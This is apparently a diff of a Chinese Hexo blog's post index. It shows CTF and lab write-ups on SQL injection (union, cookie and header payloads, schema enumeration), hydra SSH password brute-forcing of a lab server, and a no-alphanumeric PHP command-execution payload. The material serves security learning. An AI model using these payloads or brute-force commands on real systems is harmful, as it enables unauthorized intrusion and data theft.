-<a href="https://imgchr.com/i/sAdXL9"><img src="https://s3.ax1x.com/2021/01/05/sAdXL9.png" alt="sAdXL9.png"></a><br>
-之后插上<code>id = 1 and 1=2'-- +</code>不正常，即可食用之后类似上面一般类型</p>
-<h4 id="双引号加小括号包裹"><a class="header-anchor" href="#双引号加小括号包裹">¶</a>双引号加小括号包裹</h4>
-<p><a href="https://imgchr.com/i/sAdzIx"><img src="https://s3.ax1x.com/2021/01/05/sAdzIx.png" alt="sAdzIx.png"></a><br>
-首先查看<code>id = 1</code><br>
-<a href="https://imgchr.com/i/sAwPzD"><img src="https://s3.ax1x.com/2021/01/05/sAwPzD.png" alt="sAwPzD.png"></a><br>
-类似上面<code>?id = 1') and 1 = 2-- +</code>发现1=1和1=2成功执行</p>
-<h4 id="两个括号"><a class="header-anchor" href="#两个括号">¶</a>两个括号</h4>
-<p><img src="https://img-blog.csdnimg.cn/20200618112825139.png" alt="在这里插入图片描述"><br>
-<a href="https://imgchr.com/i/sAwksH"><img src="https://s3.ax1x.com/2021/01/05/sAwksH.png" alt="sAwksH.png"></a><br>
-采用<code>? id = 1')) union select 1,2,3 -- +</code></p>
-<h3 id="字符型注入"><a class="header-anchor" href="#字符型注入">¶</a>字符型注入</h3>
-<p>如果在url后拼接<code>?id=1 and 1=1</code>or<code>and 1=2</code>分别正确错误则说明为字符型注入<br>
-注入方式和数字型类似</p>
-<h3 id="搜索型注入"><a class="header-anchor" href="#搜索型注入">¶</a>搜索型注入</h3>
-<p><a href="https://imgchr.com/i/sAwALd"><img src="https://s3.ax1x.com/2021/01/05/sAwALd.png" alt="sAwALd.png"></a><br>
-%代表%前面可以有字符后面也可以有<br>
-配合HackBar食用<br>
-<a href="https://imgchr.com/i/sAwZdI"><img src="https://s3.ax1x.com/2021/01/05/sAwZdI.png" alt="sAwZdI.png"></a><br>
-post数据<code>name = a' union select 1,2,3 -- +</code></p>
-<h3 id="Cookie注入-v2"><a class="header-anchor" href="#Cookie注入-v2">¶</a>Cookie注入</h3>
-<p><a href="https://imgchr.com/i/sAwnFP"><img src="https://s3.ax1x.com/2021/01/05/sAwnFP.png" alt="sAwnFP.png"></a><br>
-配合Burp使用<br>
-<a href="https://imgchr.com/i/sAw1yQ"><img src="https://s3.ax1x.com/2021/01/05/sAw1yQ.png" alt="sAw1yQ.png"></a><br>
-改为<code>Cookie: uid = 1 union select 1,2,3</code></p>
-<h3 id="HTTP头注入-v2"><a class="header-anchor" href="#HTTP头注入-v2">¶</a>HTTP头注入</h3>
-<p><a href="https://imgchr.com/i/sAwYoq"><img src="https://s3.ax1x.com/2021/01/05/sAwYoq.png" alt="sAwYoq.png"></a><br>
-<a href="https://imgchr.com/i/sAwfSO"><img src="https://s3.ax1x.com/2021/01/05/sAwfSO.png" alt="sAwfSO.png"></a></p>
-<p>配合Burp食用<br>
-<a href="https://imgchr.com/i/sAwbkt"><img src="https://s3.ax1x.com/2021/01/05/sAwbkt.png" alt="sAwbkt.png"></a><br>
-添加XFF头<br>
-<a href="https://imgchr.com/i/sA0FhV"><img src="https://s3.ax1x.com/2021/01/05/sA0FhV.png" alt="sA0FhV.png"></a><br>
-完美成功!!!<br>
-<code>127.0.0.1' order by 4-- +</code>成功，配合联合查询即可！！！<br>
-<a href="https://imgchr.com/i/sA0VcF"><img src="https://s3.ax1x.com/2021/01/05/sA0VcF.png" alt="sA0VcF.png"></a><br>
-看图<br>
-<a href="https://imgchr.com/i/sA0u7R"><img src="https://s3.ax1x.com/2021/01/05/sA0u7R.png" alt="sA0u7R.png"></a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入之mysql学习基础(一)</title>
-    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
-    <content><![CDATA[<p>了解什么是sql注入及mysql数据库介绍</p>
-<a id="more"></a>
-<h1>MySQL的数据库结构</h1>
-<p><a href="https://imgchr.com/i/sAaGcQ"><img src="https://s3.ax1x.com/2021/01/05/sAaGcQ.png" alt="sAaGcQ.png"></a></p>
-<h1>注入的产生</h1>
-<p><a href="https://imgchr.com/i/sAalh8"><img src="https://s3.ax1x.com/2021/01/05/sAalh8.png" alt="sAalh8.png"></a></p>
-<p>id变量通过get方式获取并且直接拼接到SQL语句中，而id参数用户可控，造成注入</p>
-<h1>MySQL5注入的一般流程</h1>
-<p>获取字段数-查库名-查表名-查列名-查数据</p>
-<p>获取字段数：order by 临界值<br>
-获取库名：database()<br>
-表名和列名没有内置函数 怎么查？</p>
-<p>union语句：将不同表的两个列查询的数据去重拼接<br>
-union all ：不去重</p>
-<p>获取MySQL版本：version()<br>
-MySQL5.0以下版本只能和access数据库一样猜解<br>
-而MySQL5.0以上版本内置了information_schema库，存储了所有的数据库名、表名、列名<br>
-information_schema.tables 记录表名信息<br>
-information_schema.columns 记录列名信息<br>
-TABLE_SCHEMA 数据库字段<br>
-table_name 表名<br>
-column_name 列名<br>
-查表名：<br>
-SELECT table_name FROM information_schema.tables where TABLE_SCHEMA=database();<br>
-查列名：<br>
-SELECT column_name FROM information_schema.columns where TABLE_name=‘users’;<br>
-查数据：<br>
-select 列名 from 库名.表名</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>ssh弱口令爆破远程登录渗透过程</title>
-    <url>/2020/12/19/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<p>记一次ssh弱口令爆破远程登录渗透过程</p>
-<a id="more"></a>
-<p><strong>声明:</strong></p>
-<p><strong>实验环境由合天网安实验室和蚁景网安提供</strong></p>
-<p><strong>服务器为私人服务器</strong></p>
-<h2 id="题目展示"><a class="header-anchor" href="#题目展示">¶</a>题目展示</h2>
-<p><strong>题目:强行突破</strong></p>
-<ul>
-<li>目标：139.155.49.43</li>
-<li>port：2222</li>
-<li>提示：<a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></li>
-<li>要求：获取/root/flag.txt内容进行提交</li>
-</ul>
-<p><strong>渗透核心是信息搜所以集先进行信息搜集</strong></p>
-<h2 id="1-nmap扫描"><a class="header-anchor" href="#1-nmap扫描">¶</a>1.nmap扫描</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A -p- 139.155.49.43</span><br></pre></td></tr></table></figure>
-<p><a href="https://blog.csdn.net/haha13l4/article/details/89737637">nmap常用命令</a></p>
-<p>简单介绍以下</p>
-<ul>
-<li>-sT  Tcp连接</li>
-<li>-T 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)   -T4第五个等级</li>
-<li>-A 综合扫描</li>
-</ul>
-<p>nmap扫描完发现能利用的端口只有ssh了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/7e0b2620fac1036194909b0fb99187b4.png" alt="image-20201219193044690.png"></p>
-<h2 id="2-爬取ssh密码字典再利用hydra爆破"><a class="header-anchor" href="#2-爬取ssh密码字典再利用hydra爆破">¶</a>2.爬取ssh密码字典再利用hydra爆破</h2>
-<p><a href="https://bugku.com/mima/">密码字典生成器</a></p>
-<p>可以根据一些信息定制一些弱口令</p>
-<p>下面是两个fuzz字典</p>
-<p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
-<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
-<p><strong>我们这里使用的是 Cewl 进行网站爬取字典,因为题目中提示了 <a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></strong></p>
-<p><strong>然后使用hydra进行爆破</strong></p>
-<p><a href="https://blog.csdn.net/systemino/article/details/90114610">cewl使用指南</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl -d 2 -m 5 -w word.txt https:&#x2F;&#x2F;www.hetianlab.com </span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b3489b25749a0ff3dae640ba89926425.png" alt="Snipaste_2020-12-19_20-05-47.png"></p>
-<p>打开字典 发现有很多但是有很多中文,所以使用正则删掉爬取到的中文</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/2a3a20bb0fb598a37a885f3c3a630e22.png" alt="Snipaste_2020-12-19_20-06-50.png"></p>
-<p>双字节匹配<code>[^\x00-\xff]</code> 删除中文</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0cd012a9b95fd759df2a684344daa1bc.png" alt="Snipaste_2020-12-19_20-10-24.png"></p>
-<p>然后再   <code>\n</code> 匹配所有换行符并且删除就得到了正常的字典</p>
-<p>接下来使用hydra进行ssh爆破</p>
-<p><a href="https://www.cnblogs.com/xyz315/p/13072731.html">hydra常用命令</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l root -P word.txt 139.155.49.43 -s 2222 -f ssh</span><br></pre></td></tr></table></figure>
-<p>这里 用户用的是root，不知道用户名的可以使用 -L选择常见用户名的字典进行爆破</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/d7cb91b1505635eeda98ccf7b263eb00.png" alt="Snipaste_2020-12-19_20-26-20.png"></p>
-<p>可以看到我们成功爆出了它服务器得到密码</p>
-<h2 id="3-远程登录获取flag"><a class="header-anchor" href="#3-远程登录获取flag">¶</a>3.远程登录获取flag</h2>
-<p>知道用户名和密码了，进行远程登录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@139.155.49.43 -p 2222</span><br></pre></td></tr></table></figure>
-<p>可以看到我们成功获得了flag</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/948663faf0d2c739bf0e27b9a1d861cb.png" alt="Snipaste_2020-12-19_20-32-36.png"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>ssh弱口令爆破</category>
-      </categories>
-  </entry>
-  <entry>
     <title>sql注入常见注释及绕过</title>
     <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
@@ -2103,6 +2075,67 @@ select 列名 from 库名.表名</p>
       </categories>
   </entry>
   <entry>
+    <title>ssh弱口令爆破远程登录渗透过程</title>
+    <url>/2020/12/19/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p>记一次ssh弱口令爆破远程登录渗透过程</p>
+<a id="more"></a>
+<p><strong>声明:</strong></p>
+<p><strong>实验环境由合天网安实验室和蚁景网安提供</strong></p>
+<p><strong>服务器为私人服务器</strong></p>
+<h2 id="题目展示"><a class="header-anchor" href="#题目展示">¶</a>题目展示</h2>
+<p><strong>题目:强行突破</strong></p>
+<ul>
+<li>目标：139.155.49.43</li>
+<li>port：2222</li>
+<li>提示：<a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></li>
+<li>要求：获取/root/flag.txt内容进行提交</li>
+</ul>
+<p><strong>渗透核心是信息搜所以集先进行信息搜集</strong></p>
+<h2 id="1-nmap扫描"><a class="header-anchor" href="#1-nmap扫描">¶</a>1.nmap扫描</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A -p- 139.155.49.43</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/haha13l4/article/details/89737637">nmap常用命令</a></p>
+<p>简单介绍以下</p>
+<ul>
+<li>-sT  Tcp连接</li>
+<li>-T 时间优化(0-5)(paranoid|sneaky|polite|normal|aggressive|insane)   -T4第五个等级</li>
+<li>-A 综合扫描</li>
+</ul>
+<p>nmap扫描完发现能利用的端口只有ssh了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7e0b2620fac1036194909b0fb99187b4.png" alt="image-20201219193044690.png"></p>
+<h2 id="2-爬取ssh密码字典再利用hydra爆破"><a class="header-anchor" href="#2-爬取ssh密码字典再利用hydra爆破">¶</a>2.爬取ssh密码字典再利用hydra爆破</h2>
+<p><a href="https://bugku.com/mima/">密码字典生成器</a></p>
+<p>可以根据一些信息定制一些弱口令</p>
+<p>下面是两个fuzz字典</p>
+<p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
+<p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
+<p><strong>我们这里使用的是 Cewl 进行网站爬取字典,因为题目中提示了 <a href="https://www.hetianlab.com/">https://www.hetianlab.com/</a></strong></p>
+<p><strong>然后使用hydra进行爆破</strong></p>
+<p><a href="https://blog.csdn.net/systemino/article/details/90114610">cewl使用指南</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl -d 2 -m 5 -w word.txt https:&#x2F;&#x2F;www.hetianlab.com </span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b3489b25749a0ff3dae640ba89926425.png" alt="Snipaste_2020-12-19_20-05-47.png"></p>
+<p>打开字典 发现有很多但是有很多中文,所以使用正则删掉爬取到的中文</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2a3a20bb0fb598a37a885f3c3a630e22.png" alt="Snipaste_2020-12-19_20-06-50.png"></p>
+<p>双字节匹配<code>[^\x00-\xff]</code> 删除中文</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0cd012a9b95fd759df2a684344daa1bc.png" alt="Snipaste_2020-12-19_20-10-24.png"></p>
+<p>然后再   <code>\n</code> 匹配所有换行符并且删除就得到了正常的字典</p>
+<p>接下来使用hydra进行ssh爆破</p>
+<p><a href="https://www.cnblogs.com/xyz315/p/13072731.html">hydra常用命令</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l root -P word.txt 139.155.49.43 -s 2222 -f ssh</span><br></pre></td></tr></table></figure>
+<p>这里 用户用的是root，不知道用户名的可以使用 -L选择常见用户名的字典进行爆破</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d7cb91b1505635eeda98ccf7b263eb00.png" alt="Snipaste_2020-12-19_20-26-20.png"></p>
+<p>可以看到我们成功爆出了它服务器得到密码</p>
+<h2 id="3-远程登录获取flag"><a class="header-anchor" href="#3-远程登录获取flag">¶</a>3.远程登录获取flag</h2>
+<p>知道用户名和密码了，进行远程登录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@139.155.49.43 -p 2222</span><br></pre></td></tr></table></figure>
+<p>可以看到我们成功获得了flag</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/948663faf0d2c739bf0e27b9a1d861cb.png" alt="Snipaste_2020-12-19_20-32-36.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>ssh弱口令爆破</category>
+      </categories>
+  </entry>
+  <entry>
     <title>phar及zip文件包含</title>
     <url>/2020/12/06/zip%E5%92%8Cphar%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<p>phar与zip协议的文件包含</p>
@@ -2183,49 +2216,6 @@ index.php</p>
       <categories>
         <category>前端</category>
         <category>hexo</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>无数字字母rce</title>
-    <url>/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce(ctfshow%20web%E5%85%A5%E9%97%A856)/</url>
-    <content><![CDATA[<p>面对ctfshow web入门56的学习</p>
-<a id="more"></a>
-<p><strong>我们根据这一题直接进入主题</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web56</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>过滤了字母，数字。</p>
-<p>看了三位师傅的 wp才醒悟 <a href="https://www.gem-love.com/websecurity/1407.html">y1ng</a> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神</a> <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">firebasky</a>  再次感谢三位师傅</p>
-<p><strong>先说一下这一题的解题思路：</strong></p>
-<p><strong>我们通过post一个文件(文件里面写入sh命令)，在上传的过程中，通过<code>.(点，也就是 source命令)</code>去执行执行这个文件。一般来说我们上传的文件在linux下临时保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</strong><br>
-**<code>注意：通过</code>.<code>去执行sh命令不需要有执行权限**</code></p>
-<p>好，接下来我已一个小白的角度分析题目所需的知识点。 首先是构造一个post文件上传，这里面也是很复杂的，参考 <a href="https://www.runoob.com/php/php-file-upload.html">PHP 文件上传 </a></p>
-<p><strong>下面就是我们构造的post文件上传数据包</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>然后直接抓包</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200259866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
-接下来构造poc命令<br>
-<code>?c=.+/???/????????[@-[]</code><br>
-用到Linux下的glob通配符：</p>
-<ul>
-<li><code>*</code>可以代替0个及以上任意字符</li>
-<li><code>?</code>可以代表1个任意字符<br>
-注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br>
-<img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
-</ul>
-<p>介绍一下<strong>bin目录:</strong></p>
-<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
-<p>在这里再解释一下为什么加上#！  #!的意思是调用  /bin/sh 命令所以需要加</p>
-<p>成功遍历当前目录文件<br>
-<img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>直接cat 得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200444686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>补充</strong></p>
-<p>1.playload:?c=.+/???/???[@-[] 因为 .命令 (也就是source命令)执行需要用空格 我们用 + 绕过（也就是%20）。</p>
-<p>2.文件上传的时候 #!/bin/sh 加上 #！的意思是调用bin/sh的命令</p>
-<p>3.我们的poc的? 的数量只有11个，因为最后一个匹配为大写，用[@-[] 代替了，不需要在它的后面再加上?了</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
       </categories>
   </entry>
   <entry>
@@ -2340,6 +2330,49 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>文件包含</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>无数字字母rce</title>
+    <url>/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce(ctfshow%20web%E5%85%A5%E9%97%A856)/</url>
+    <content><![CDATA[<p>面对ctfshow web入门56的学习</p>
+<a id="more"></a>
+<p><strong>我们根据这一题直接进入主题</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web56</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了字母，数字。</p>
+<p>看了三位师傅的 wp才醒悟 <a href="https://www.gem-love.com/websecurity/1407.html">y1ng</a> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神</a> <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">firebasky</a>  再次感谢三位师傅</p>
+<p><strong>先说一下这一题的解题思路：</strong></p>
+<p><strong>我们通过post一个文件(文件里面写入sh命令)，在上传的过程中，通过<code>.(点，也就是 source命令)</code>去执行执行这个文件。一般来说我们上传的文件在linux下临时保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</strong><br>
+**<code>注意：通过</code>.<code>去执行sh命令不需要有执行权限**</code></p>
+<p>好，接下来我已一个小白的角度分析题目所需的知识点。 首先是构造一个post文件上传，这里面也是很复杂的，参考 <a href="https://www.runoob.com/php/php-file-upload.html">PHP 文件上传 </a></p>
+<p><strong>下面就是我们构造的post文件上传数据包</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后直接抓包</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200259866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
+接下来构造poc命令<br>
+<code>?c=.+/???/????????[@-[]</code><br>
+用到Linux下的glob通配符：</p>
+<ul>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符<br>
+注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br>
+<img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<p>介绍一下<strong>bin目录:</strong></p>
+<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
+<p>在这里再解释一下为什么加上#！  #!的意思是调用  /bin/sh 命令所以需要加</p>
+<p>成功遍历当前目录文件<br>
+<img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>直接cat 得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200444686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>补充</strong></p>
+<p>1.playload:?c=.+/???/???[@-[] 因为 .命令 (也就是source命令)执行需要用空格 我们用 + 绕过（也就是%20）。</p>
+<p>2.文件上传的时候 #!/bin/sh 加上 #！的意思是调用bin/sh的命令</p>
+<p>3.我们的poc的? 的数量只有11个，因为最后一个匹配为大写，用[@-[] 代替了，不需要在它的后面再加上?了</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>命令执行</category>
       </categories>
   </entry>
   <entry>
